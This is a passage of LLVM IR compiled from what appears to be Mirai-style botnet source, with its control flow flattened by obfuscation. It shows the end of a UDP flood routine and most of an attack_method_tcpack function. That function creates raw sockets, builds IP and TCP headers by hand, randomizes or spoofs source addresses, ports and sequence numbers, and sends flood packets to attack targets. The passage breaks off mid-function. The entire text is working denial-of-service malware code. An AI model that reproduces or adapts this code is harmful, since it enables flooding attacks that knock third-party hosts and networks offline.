; <label>:267:                                    ; preds = %loopEntry
  %268 = load i8, i8* %19, align 1
  %269 = icmp ne i8 %268, 0
  %270 = select i1 %269, i32 -1550118166, i32 1408721445
  store i32 %270, i32* %switchVar
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  %272 = load i8*, i8** %26, align 8
  %273 = load i16, i16* %18, align 2
  %274 = zext i16 %273 to i32
  call void @rand_str(i8* %272, i32 %274)
  store i32 1408721445, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  %276 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 7
  store i16 0, i16* %277, align 2
  %278 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %279 = bitcast %struct.iphdr* %278 to i16*
  %280 = call zeroext i16 @checksum_generic(i16* %279, i32 20)
  %281 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i32 0, i32 7
  store i16 %280, i16* %282, align 2
  %283 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %284 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %283, i32 0, i32 3
  store i16 0, i16* %284, align 2
  %285 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %286 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %287 = bitcast %struct.udphdr* %286 to i8*
  %288 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %289 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %288, i32 0, i32 2
  %290 = load i16, i16* %289, align 2
  %291 = load i16, i16* %18, align 2
  %292 = zext i16 %291 to i64
  %293 = add i64 8, %292
  %294 = trunc i64 %293 to i32
  %295 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %285, i8* %287, i16 zeroext %290, i32 %294)
  %296 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %297 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %296, i32 0, i32 3
  store i16 %295, i16* %297, align 2
  %298 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %299 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %298, i32 0, i32 1
  %300 = load i16, i16* %299, align 2
  %301 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %301, i64 %303
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %304, i32 0, i32 0
  %306 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %305, i32 0, i32 1
  store i16 %300, i16* %306, align 2
  %307 = load i32, i32* %10, align 4
  %308 = load i8*, i8** %23, align 8
  %309 = load i16, i16* %18, align 2
  %310 = zext i16 %309 to i64
  %311 = add i64 28, %310
  %312 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %313 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %314 = load i32, i32* %9, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %313, i64 %315
  %317 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %316, i32 0, i32 0
  %318 = bitcast %struct.sockaddr_in* %317 to %struct.sockaddr*
  store %struct.sockaddr* %318, %struct.sockaddr** %312, align 8
  %319 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %320 = load %struct.sockaddr*, %struct.sockaddr** %319, align 8
  %321 = call i64 @sendto(i32 %307, i8* %308, i64 %311, i32 16384, %struct.sockaddr* %320, i32 16)
  store i32 2059130992, i32* %switchVar
  br label %loopEnd

; <label>:322:                                    ; preds = %loopEntry
  %323 = load i32, i32* %9, align 4
  %324 = add nsw i32 %323, 1
  store i32 %324, i32* %9, align 4
  store i32 969075326, i32* %switchVar
  br label %loopEnd

; <label>:325:                                    ; preds = %loopEntry
  store i32 -141505433, i32* %switchVar
  br label %loopEnd

; <label>:326:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %325, %322, %275, %271, %267, %262, %257, %252, %247, %242, %237, %233, %229, %208, %183, %177, %176, %175, %172, %143, %139, %94, %88, %87, %84, %78, %77, %73, %72, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 1458)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -1175393833, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1175393833, label %first
    i32 -1251283465, label %109
    i32 -1204098265, label %110
    i32 1703130836, label %116
    i32 -2084649370, label %119
    i32 -51608031, label %120
    i32 191539625, label %126
    i32 -52332483, label %174
    i32 -2065883645, label %178
    i32 1039231673, label %273
    i32 -1895042074, label %279
    i32 1700920445, label %282
    i32 -1770265079, label %285
    i32 1521721755, label %286
    i32 -1094123961, label %287
    i32 295133692, label %293
    i32 1070425993, label %316
    i32 -250578546, label %337
    i32 -2063051436, label %341
    i32 646543837, label %345
    i32 1394127653, label %350
    i32 -1364450131, label %356
    i32 -401656867, label %361
    i32 -1117013387, label %367
    i32 -1221899639, label %372
    i32 893903647, label %378
    i32 2123499745, label %382
    i32 -883586087, label %386
    i32 789952396, label %390
    i32 1612862254, label %394
    i32 1260665600, label %398
    i32 515928716, label %401
    i32 -399586658, label %450
    i32 98715116, label %453
    i32 -323917994, label %454
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %107 = icmp eq i32 %.reload, -1
  %108 = select i1 %107, i32 -1251283465, i32 -1204098265
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 -323917994, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %111 = load i32, i32* %10, align 4
  %112 = bitcast i32* %9 to i8*
  %113 = call i32 @setsockopt(i32 %111, i32 0, i32 3, i8* %112, i32 4) #6
  %114 = icmp eq i32 %113, -1
  %115 = select i1 %114, i32 1703130836, i32 -2084649370
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = load i32, i32* %10, align 4
  %118 = call i32 @close(i32 %117)
  store i32 -323917994, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -51608031, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %9, align 4
  %122 = load i8, i8* %5, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %121, %123
  %125 = select i1 %124, i32 191539625, i32 -1770265079
  store i32 %125, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  store i8* getelementptr inbounds ([513 x i8], [513 x i8]* @.str.256, i32 0, i32 0), i8** %31, align 8
  %127 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %128 = load i8**, i8*** %11, align 8
  %129 = load i32, i32* %9, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8*, i8** %128, i64 %130
  store i8* %127, i8** %131, align 8
  %132 = load i8**, i8*** %11, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds i8*, i8** %132, i64 %134
  %136 = load i8*, i8** %135, align 8
  %137 = bitcast i8* %136 to %struct.iphdr*
  store %struct.iphdr* %137, %struct.iphdr** %29, align 8
  %138 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %139 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %138, i64 1
  %140 = bitcast %struct.iphdr* %139 to %struct.tcphdr*
  store %struct.tcphdr* %140, %struct.tcphdr** %30, align 8
  %141 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %142 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %141, i64 512
  %143 = bitcast %struct.tcphdr* %142 to i8*
  store i8* %143, i8** %31, align 8
  %144 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %145 = bitcast %struct.iphdr* %144 to i8*
  %146 = load i8, i8* %145, align 4
  %147 = and i8 %146, 15
  %148 = or i8 %147, 64
  store i8 %148, i8* %145, align 4
  %149 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %150 = bitcast %struct.iphdr* %149 to i8*
  %151 = load i8, i8* %150, align 4
  %152 = and i8 %151, -16
  %153 = or i8 %152, 5
  store i8 %153, i8* %150, align 4
  %154 = load i8, i8* %12, align 1
  %155 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 1
  store i8 %154, i8* %156, align 1
  %157 = load i32, i32* %26, align 4
  %158 = sext i32 %157 to i64
  %159 = add i64 40, %158
  %160 = trunc i64 %159 to i16
  %161 = call zeroext i16 @htons(i16 zeroext %160) #7
  %162 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 2
  store i16 %161, i16* %163, align 2
  %164 = load i16, i16* %13, align 2
  %165 = call zeroext i16 @htons(i16 zeroext %164) #7
  %166 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 3
  store i16 %165, i16* %167, align 4
  %168 = load i8, i8* %14, align 1
  %169 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 5
  store i8 %168, i8* %170, align 4
  %171 = load i8, i8* %15, align 1
  %172 = icmp ne i8 %171, 0
  %173 = select i1 %172, i32 -52332483, i32 -2065883645
  store i32 %173, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %176 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 4
  store i16 %175, i16* %177, align 2
  store i32 -2065883645, i32* %switchVar
  br label %loopEnd

; <label>:178:                                    ; preds = %loopEntry
  %179 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 6
  store i8 6, i8* %180, align 1
  %181 = load i32, i32* %28, align 4
  %182 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 8
  store i32 %181, i32* %183, align 4
  %184 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %185 = load i32, i32* %9, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i64 %186
  %188 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %187, i32 0, i32 1
  %189 = load i32, i32* %188, align 4
  %190 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 9
  store i32 %189, i32* %191, align 4
  %192 = load i16, i16* %16, align 2
  %193 = call zeroext i16 @htons(i16 zeroext %192) #7
  %194 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %195 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %194, i32 0, i32 0
  store i16 %193, i16* %195, align 4
  %196 = load i16, i16* %17, align 2
  %197 = call zeroext i16 @htons(i16 zeroext %196) #7
  %198 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 1
  store i16 %197, i16* %199, align 2
  %200 = load i32, i32* %18, align 4
  %201 = trunc i32 %200 to i16
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = zext i16 %202 to i32
  %204 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 2
  store i32 %203, i32* %205, align 4
  %206 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %207 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %206, i32 0, i32 4
  %208 = load i16, i16* %207, align 4
  %209 = and i16 %208, -241
  %210 = or i16 %209, 80
  store i16 %210, i16* %207, align 4
  %211 = load i8, i8* %20, align 1
  %212 = sext i8 %211 to i16
  %213 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 4
  %215 = load i16, i16* %214, align 4
  %216 = and i16 %212, 1
  %217 = shl i16 %216, 13
  %218 = and i16 %215, -8193
  %219 = or i16 %218, %217
  store i16 %219, i16* %214, align 4
  %220 = load i8, i8* %21, align 1
  %221 = sext i8 %220 to i16
  %222 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 4
  %224 = load i16, i16* %223, align 4
  %225 = and i16 %221, 1
  %226 = shl i16 %225, 12
  %227 = and i16 %224, -4097
  %228 = or i16 %227, %226
  store i16 %228, i16* %223, align 4
  %229 = load i8, i8* %22, align 1
  %230 = sext i8 %229 to i16
  %231 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %232 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %231, i32 0, i32 4
  %233 = load i16, i16* %232, align 4
  %234 = and i16 %230, 1
  %235 = shl i16 %234, 11
  %236 = and i16 %233, -2049
  %237 = or i16 %236, %235
  store i16 %237, i16* %232, align 4
  %238 = load i8, i8* %23, align 1
  %239 = sext i8 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 4
  %242 = load i16, i16* %241, align 4
  %243 = and i16 %239, 1
  %244 = shl i16 %243, 10
  %245 = and i16 %242, -1025
  %246 = or i16 %245, %244
  store i16 %246, i16* %241, align 4
  %247 = load i8, i8* %24, align 1
  %248 = sext i8 %247 to i16
  %249 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %250 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %249, i32 0, i32 4
  %251 = load i16, i16* %250, align 4
  %252 = and i16 %248, 1
  %253 = shl i16 %252, 9
  %254 = and i16 %251, -513
  %255 = or i16 %254, %253
  store i16 %255, i16* %250, align 4
  %256 = load i8, i8* %25, align 1
  %257 = sext i8 %256 to i16
  %258 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %259 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %258, i32 0, i32 4
  %260 = load i16, i16* %259, align 4
  %261 = and i16 %257, 1
  %262 = shl i16 %261, 8
  %263 = and i16 %260, -257
  %264 = or i16 %263, %262
  store i16 %264, i16* %259, align 4
  %265 = call i32 @rand() #6
  %266 = srem i32 %265, 65535
  %267 = trunc i32 %266 to i16
  %268 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %269 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %268, i32 0, i32 5
  store i16 %267, i16* %269, align 2
  %270 = load i8, i8* %22, align 1
  %271 = icmp ne i8 %270, 0
  %272 = select i1 %271, i32 1039231673, i32 -1895042074
  store i32 %272, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %274 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %275 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %274, i32 0, i32 4
  %276 = load i16, i16* %275, align 4
  %277 = and i16 %276, -2049
  %278 = or i16 %277, 2048
  store i16 %278, i16* %275, align 4
  store i32 -1895042074, i32* %switchVar
  br label %loopEnd

; <label>:279:                                    ; preds = %loopEntry
  %280 = load i8*, i8** %31, align 8
  %281 = load i32, i32* %26, align 4
  call void @rand_str(i8* %280, i32 %281)
  store i32 1700920445, i32* %switchVar
  br label %loopEnd

; <label>:282:                                    ; preds = %loopEntry
  %283 = load i32, i32* %9, align 4
  %284 = add nsw i32 %283, 1
  store i32 %284, i32* %9, align 4
  store i32 -51608031, i32* %switchVar
  br label %loopEnd

; <label>:285:                                    ; preds = %loopEntry
  store i32 1521721755, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1094123961, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i32, i32* %9, align 4
  %289 = load i8, i8* %5, align 1
  %290 = zext i8 %289 to i32
  %291 = icmp slt i32 %288, %290
  %292 = select i1 %291, i32 295133692, i32 98715116
  store i32 %292, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  %294 = load i8**, i8*** %11, align 8
  %295 = load i32, i32* %9, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds i8*, i8** %294, i64 %296
  %298 = load i8*, i8** %297, align 8
  store i8* %298, i8** %32, align 8
  %299 = load i8*, i8** %32, align 8
  %300 = bitcast i8* %299 to %struct.iphdr*
  store %struct.iphdr* %300, %struct.iphdr** %33, align 8
  %301 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i64 1
  %303 = bitcast %struct.iphdr* %302 to %struct.tcphdr*
  store %struct.tcphdr* %303, %struct.tcphdr** %34, align 8
  %304 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %305 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %304, i64 1
  %306 = bitcast %struct.tcphdr* %305 to i8*
  store i8* %306, i8** %35, align 8
  %307 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %308 = load i32, i32* %9, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %307, i64 %309
  %311 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i32 0, i32 2
  %312 = load i8, i8* %311, align 4
  %313 = zext i8 %312 to i32
  %314 = icmp slt i32 %313, 32
  %315 = select i1 %314, i32 1070425993, i32 -250578546
  store i32 %315, i32* %switchVar
  br label %loopEnd

; <label>:316:                                    ; preds = %loopEntry
  %317 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %318 = load i32, i32* %9, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %317, i64 %319
  %321 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %320, i32 0, i32 1
  %322 = load i32, i32* %321, align 4
  %323 = call i32 @ntohl(i32 %322) #7
  %324 = call i32 @rand_next()
  %325 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %326 = load i32, i32* %9, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %325, i64 %327
  %329 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %328, i32 0, i32 2
  %330 = load i8, i8* %329, align 4
  %331 = zext i8 %330 to i32
  %332 = lshr i32 %324, %331
  %333 = add i32 %323, %332
  %334 = call i32 @htonl(i32 %333) #7
  %335 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 9
  store i32 %334, i32* %336, align 4
  store i32 -250578546, i32* %switchVar
  br label %loopEnd

; <label>:337:                                    ; preds = %loopEntry
  %338 = load i32, i32* %28, align 4
  %339 = icmp eq i32 %338, -1
  %340 = select i1 %339, i32 -2063051436, i32 646543837
  store i32 %340, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = call i32 @rand_next()
  %343 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %344 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %343, i32 0, i32 8
  store i32 %342, i32* %344, align 4
  store i32 646543837, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = load i16, i16* %13, align 2
  %347 = zext i16 %346 to i32
  %348 = icmp eq i32 %347, 65535
  %349 = select i1 %348, i32 1394127653, i32 -1364450131
  store i32 %349, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  %351 = call i32 @rand_next()
  %352 = and i32 %351, 65535
  %353 = trunc i32 %352 to i16
  %354 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %355 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %354, i32 0, i32 3
  store i16 %353, i16* %355, align 4
  store i32 -1364450131, i32* %switchVar
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  %357 = load i16, i16* %16, align 2
  %358 = zext i16 %357 to i32
  %359 = icmp eq i32 %358, 65535
  %360 = select i1 %359, i32 -401656867, i32 -1117013387
  store i32 %360, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  %362 = call i32 @rand_next()
  %363 = and i32 %362, 65535
  %364 = trunc i32 %363 to i16
  %365 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %366 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %365, i32 0, i32 0
  store i16 %364, i16* %366, align 4
  store i32 -1117013387, i32* %switchVar
  br label %loopEnd

; <label>:367:                                    ; preds = %loopEntry
  %368 = load i16, i16* %17, align 2
  %369 = zext i16 %368 to i32
  %370 = icmp eq i32 %369, 65535
  %371 = select i1 %370, i32 -1221899639, i32 893903647
  store i32 %371, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  %373 = call i32 @rand_next()
  %374 = and i32 %373, 65535
  %375 = trunc i32 %374 to i16
  %376 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %377 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %376, i32 0, i32 1
  store i16 %375, i16* %377, align 2
  store i32 893903647, i32* %switchVar
  br label %loopEnd

; <label>:378:                                    ; preds = %loopEntry
  %379 = load i32, i32* %18, align 4
  %380 = icmp eq i32 %379, 65535
  %381 = select i1 %380, i32 2123499745, i32 -883586087
  store i32 %381, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = call i32 @rand_next()
  %384 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 2
  store i32 %383, i32* %385, align 4
  store i32 -883586087, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = load i32, i32* %19, align 4
  %388 = icmp eq i32 %387, 65535
  %389 = select i1 %388, i32 789952396, i32 1612862254
  store i32 %389, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = call i32 @rand_next()
